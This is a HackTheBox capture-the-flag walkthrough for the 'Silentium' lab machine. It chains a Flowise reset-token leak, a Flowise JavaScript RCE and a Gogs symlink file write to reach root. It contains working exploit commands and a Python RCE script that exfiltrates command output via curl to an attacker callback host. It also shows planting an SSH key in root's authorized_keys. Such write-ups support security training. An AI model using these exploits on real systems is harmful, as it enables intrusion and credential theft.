# Silentium — HackTheBox Walkthrough

## Machine Info
- **Name:** Silentium
- **IP:** 10.129.37.127
- **OS:** Linux (Ubuntu 24.04)
- **Difficulty:** Easy
- **CVEs:** CVE-2025-58434, CVE-2025-59528, CVE-2025-8110

---

## 1. Reconnaissance

### Port Scan

```bash
nmap -sC -sV -p- --min-rate 5000 10.129.37.127 -oN nmap.txt
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

### Add Hosts

```bash
echo "10.129.37.127 silentium.htb staging.silentium.htb" | sudo tee -a /etc/hosts
```

### Subdomain Enumeration

```bash
ffuf -u http://silentium.htb/ \
  -H "Host: FUZZ.silentium.htb" \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -fs 178
```

Result: `staging` → `staging.silentium.htb`

Browsing to `http://staging.silentium.htb/` shows a **Flowise** login page (title: "Flowise - Build AI Agents, Visually").

### Discover Gogs via Nginx Config

Later, after gaining SSH access, check nginx config for more vhosts:

```bash
cat /etc/nginx/sites-enabled/default
```

Found: `staging-v2-code.dev.silentium.htb` → proxies to `127.0.0.1:3001` (Gogs 0.13.3).

Add to hosts:

```bash
echo "10.129.37.127 staging-v2-code.dev.silentium.htb" | sudo tee -a /etc/hosts
```

---

## 2. Flowise Password Reset Token Leak (CVE-2025-58434)

Flowise's forgot-password endpoint leaks the user's ID, bcrypt hash, and password reset token:

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

Response:

```json
{
  "Action": "forgot_password",
  "UserID": 1,
  "User": {
    "id": 1,
    "email": "ben@silentium.htb",
    "password": "$2a$05$[REDACTED]"
  },
  "tempToken": "eyJhbGciOiJIUzI1NiIs..."
}
```

---

## 3. Password Reset

Use the leaked `tempToken` to reset ben's password:

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
    "token": "<tempToken from above>",
    "password": "[REDACTED]"
  }'
```

---

## 4. Flowise Login

Authenticate and get a session cookie:

```bash
curl -s -c cookies.txt -X POST http://staging.silentium.htb/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb","password":"[REDACTED]"}'
```

**Important:** Many API endpoints require the `x-request-from: internal` header for full access.

---

## 5. Flowise RCE (CVE-2025-59528)

The `/api/v1/node-load-method/customMCP` endpoint allows arbitrary JavaScript execution via the `mcpServerConfig` parameter.

### Setup Callback Server

```bash
python3 -c "
import http.server, socketserver, sys
class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        l=int(self.headers.get('Content-Length',0))
        d=self.rfile.read(l).decode('utf-8','replace')
        sys.stdout.write(f'DATA:{d}\n');sys.stdout.flush()
        self.send_response(200);self.end_headers();self.wfile.write(b'OK')
    def do_GET(self):
        self.send_response(200);self.end_headers()
    def log_message(self,f,*a):pass
s=socketserver.TCPServer(('0.0.0.0',8888),H)
s.serve_forever()
" &
```

### RCE Exploit Script

```python
#!/usr/bin/env python3
"""Flowise RCE via CVE-2025-59528"""
import requests, time

URL = "http://staging.silentium.htb"
CALLBACK = "http://10.10.14.173:8888"  # Your VPN IP

s = requests.Session()

# Login
s.post(f"{URL}/api/v1/auth/login",
       json={"email": "ben@silentium.htb", "password": "[REDACTED]"},
       timeout=10)

def rce(cmd):
    """Execute command inside Flowise container"""
    # Build payload: spawn detached child process to avoid crashing Flowise
    full_cmd = f'{cmd} > /tmp/o 2>&1; curl -s -X POST -d @/tmp/o {CALLBACK}/x'

    js_payload = (
        '({"x":(function(){'
        'const cp=process.mainModule.require("child_process");'
        f'cp.spawn("sh",["-c","{full_cmd}"],'
        '{detached:true,stdio:"ignore"}).unref();'
        'return 1;})()})'
    )

    s.post(f"{URL}/api/v1/node-load-method/customMCP",
           json={"loadMethod": "listActions",
                 "inputs": {"mcpServerConfig": js_payload}},
           headers={"x-request-from": "internal"},
           timeout=10)

    time.sleep(5)  # Wait for callback

# Execute commands
rce("id")          # uid=0(root) gid=0(root) — root in Docker container
rce("hostname")    # c78c3cceb7ba — Docker container
rce("env")         # Leak environment variables
```

### Key Technical Detail

Using `execSync` or blocking calls will **crash Flowise**. The workaround is:

```javascript
cp.spawn("sh", ["-c", "CMD"], {detached: true, stdio: "ignore"}).unref()
```

This spawns a non-blocking detached child process.

---

## 6. Credential Harvesting

Execute `env` via RCE to dump environment variables:

```
FLOWISE_PASSWORD=[REDACTED]
FLOWISE_USERNAME=ben
SMTP_USER=test
SMTP_PASS=[REDACTED]
```

---

## 7. SSH Access — User Flag

```bash
ssh ben@10.129.37.127
# Password: [REDACTED]
```

```bash
ben@silentium:~$ cat user.txt
[REDACTED]
```

---

## 8. Gogs Discovery & Enumeration

### Identify Gogs

```bash
ben@silentium:~$ cat /etc/nginx/sites-enabled/default
```

Shows `staging-v2-code.dev.silentium.htb` proxying to `127.0.0.1:3001`.

```bash
ben@silentium:~$ ps aux | grep gogs
root  1524  /opt/gogs/gogs/gogs web
```

Gogs 0.13.3 runs **as root** directly on the host (not Dockerized).

### Register on Gogs

Gogs has a captcha on registration. Two options:

**Option A — Selenium OCR bypass:**
```python
from playwright.sync_api import sync_playwright
# Use pytesseract to solve the captcha image automatically
```

**Option B — Manual registration:**
Browse to `http://staging-v2-code.dev.silentium.htb/user/sign_up` and register.

Account created: `hacker0:[REDACTED]`

### Get API Token

```bash
# Login via web UI, then go to Settings → Applications → Generate Token
# Or via the API:
curl -s -u "hacker0:[REDACTED]" \
  "http://staging-v2-code.dev.silentium.htb/api/v1/users/hacker0/tokens" \
  -X POST -H "Content-Type: application/json" \
  -d '{"name":"exploit"}'
```

Save the token value.

---

## 9. Root via CVE-2025-8110 (Gogs Symlink RCE)

**CVE-2025-8110** bypasses the path traversal fix (CVE-2024-55947) by exploiting symlinks. Gogs validates file paths but does **not** check if a path is a symlink pointing outside the repository. The PutContents API follows the symlink and writes to the target.

### Generate SSH Key Pair

```bash
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N ""
cat ~/.ssh/id_ed25519.pub
# ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI... claw@clawsec-pentest
```

### Step 1: Create Repo with Symlink to `/root/.ssh/authorized_keys`

```bash
TOKEN="[REDACTED]"
BASE="http://staging-v2-code.dev.silentium.htb"

# Create new repo via API
curl -s "$BASE/api/v1/user/repos" \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"exploit","auto_init":true,"readme":"Default"}'

# Clone repo
git clone http://hacker0:[REDACTED]@$BASE/hacker0/exploit.git /tmp/exploit
cd /tmp/exploit
git config user.email "hacker0@test.com"
git config user.name "hacker0"

# Create symlink pointing to root's authorized_keys
ln -s /root/.ssh/authorized_keys malicious_link

# Commit and push the symlink
git add malicious_link
git commit -m "Add symlink"
git push
```

### Step 2: Write SSH Key Through the Symlink via PutContents API

```bash
# Our SSH public key
SSH_KEY='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJo/PBnM9O+3o1Y7nHUhUBYNuRJrNmmmjWLbR370vd9R claw@clawsec-pentest'

# Base64 encode it
B64=$(echo -n "$SSH_KEY" | base64 -w0)

# Write through the symlink — Gogs follows it and writes to /root/.ssh/authorized_keys
curl -s -X PUT "$BASE/api/v1/repos/hacker0/exploit/contents/malicious_link" \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"message\":\"exploit\",\"content\":\"$B64\"}"
```

The API returns HTTP 201 — the file was written through the symlink to `/root/.ssh/authorized_keys` by the Gogs process (running as root).

### Step 3: SSH as Root

```bash
ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_ed25519 root@10.129.37.127
```

```
root@silentium:~# id
uid=0(root) gid=0(root) groups=0(root)

root@silentium:~# cat /root/root.txt
[REDACTED]
```

---

## Summary

| Step | Technique | CVE |
|------|-----------|-----|
| Recon | nmap, ffuf subdomain enum, nginx config | — |
| Info Leak | Flowise forgot-password leaks hash + token | CVE-2025-58434 |
| Account Takeover | Password reset with leaked token | — |
| RCE | Flowise customMCP endpoint → container root | CVE-2025-59528 |
| Creds | Environment variables in Docker container | — |
| Foothold | SSH with leaked SMTP credentials | — |
| Privesc | Gogs symlink → write to /root/.ssh/authorized_keys | CVE-2025-8110 |

## Key Lessons

1. **Symlink-based file write (CVE-2025-8110)** — Gogs validates file paths but not symlink destinations. Commit a symlink, then use PutContents API to write through it. This bypasses the CVE-2024-55947 path traversal fix.
2. **Non-blocking RCE** — When exploiting RCE in long-running processes (Flowise), use `spawn()` with `detached:true, stdio:"ignore", .unref()` instead of `execSync()` to avoid crashing the parent process.
3. **`x-request-from: internal`** — Flowise requires this header for full API access post-authentication. Without it, many endpoints return limited data.
4. **Docker env vars** — Always check environment variables inside containers for credentials that may grant access to other services.
5. **Git services as root** — Self-hosted Git services (Gogs, Gitea) commonly run as root, making any file write vulnerability a direct path to full system compromise.
6. **Alternative file targets** — The symlink can point to any file: `/root/.ssh/authorized_keys`, `/etc/cron.d/*`, `/etc/passwd`, etc. Writing an SSH key is the cleanest approach for direct root shell access.
